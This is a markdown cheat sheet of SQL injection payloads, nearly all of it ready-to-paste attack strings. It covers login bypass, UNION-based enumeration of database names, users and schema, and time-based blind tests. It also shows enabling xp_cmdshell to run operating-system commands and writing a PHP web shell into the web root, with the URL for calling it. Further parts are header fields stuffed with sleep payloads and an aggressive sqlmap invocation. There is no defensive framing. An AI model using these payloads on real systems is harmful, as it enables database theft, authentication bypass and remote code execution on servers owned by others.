# SQLi Payloads

Tautology : To login bypass

```
' OR 1=1 -- //
```

Tautology : To get Version using Tautology

```
' or 1=1 in (select @@version) -- //
```

Order By : To find number of columns in the table

```
' ORDER BY 1-- //
```

Union : Using Order By, Enumerating the current database name, user, and MySQL version.
(adjust the columns according to the table. starting null and ending database())

```
' UNION SELECT null, null, database(), user(), @@version -- //
```

Union : retrieve the columns table from the information_schema

```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

Blind SQL:

```
' AND IF (1=1, sleep(3),'false') -- //
```

```
' or sleep(15) and 1=1#
' or sleep(15)#
' union select sleep(15),null#
```

Code Execution : xp_cmdshell in Microsoft SQL need to be enable to work this.

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami'; //to run commands
```

Code Execution: Uploading an RCE to an Writable folder. (/var/www/html/). Adjust Code Accordingly.

```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Command to execute RCE.
`http://<IP>/webshell.php?cmd=<command>`

```
%22)%20AND%201337%3dBENCHMARK(5000000,MD5(0x774c5341))%20AND%20(%221337%22%20LIKE%20%221337
```

```
ADD THESE HEADERS TO YOUR WEB REQUESTS
 
If the SQL injection works, there will be a 30sec delay between the request and response!
 
HEADERS: 
Accept: "' or sleep(30)='"
Accept-Charset: "' or sleep(30)='"
Accept-Datetime: "' or sleep(30)='"
Accept-Encoding: "' or sleep(30)='"
Accept-Language: "' or sleep(30)='"
Authorization: "' or sleep(30)='"
Cache-Control: "' or sleep(30)='"
Connection: "' or sleep(30)='"
Content-Length: "' or sleep(30)='"
Content-MD5: "' or sleep(30)='"
Content-Type: "' or sleep(30)='"
Cookie: "' or sleep(30)='"
Date: "' or sleep(30)='"
Expect: "' or sleep(30)='"
Forwarded: "' or sleep(30)='"
From: "' or sleep(30)='"
If-Match: "' or sleep(30)='"
If-Modified-Since: "' or sleep(30)='"
If-None-Match: "' or sleep(30)='"
If-Range: "' or sleep(30)='"
If-Unmodified-Since: "' or sleep(30)='"
Max-Forwards: "' or sleep(30)='"
Origin: "' or sleep(30)='"
Pragma: "' or sleep(30)='"
Proxy-Authorization: "' or sleep(30)='"
Range: "' or sleep(30)='"
Referer: "' or sleep(30)='"
TE: "' or sleep(30)='"
Upgrade: "' or sleep(30)='"
User-Agent: "' or sleep(30)='"
Via: "' or sleep(30)='"
Warning: "' or sleep(30)='"
X-Client-IP: "' or sleep(30)='"
X-Remote-IP: "' or sleep(30)='"
X-Remote-Addr: "' or sleep(30)='"
X-Forwarded-For: "' or sleep(30)='"
X-Originating-IP: "' or sleep(30)='"
X-Host: "' or sleep(30)='"
X-Forwarded-Host: "' or sleep(30)='"
```

```
sqlmap -u "https://www[.]example[.]com/something/thing/filter-thing.php?vulnerable-param=123& another-param=123" --dbs --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
```

```
--dbs --level=5 --risk=3 --random-agent --user-agent -v3 
```

```
--batch --threads=10 --dbs
```



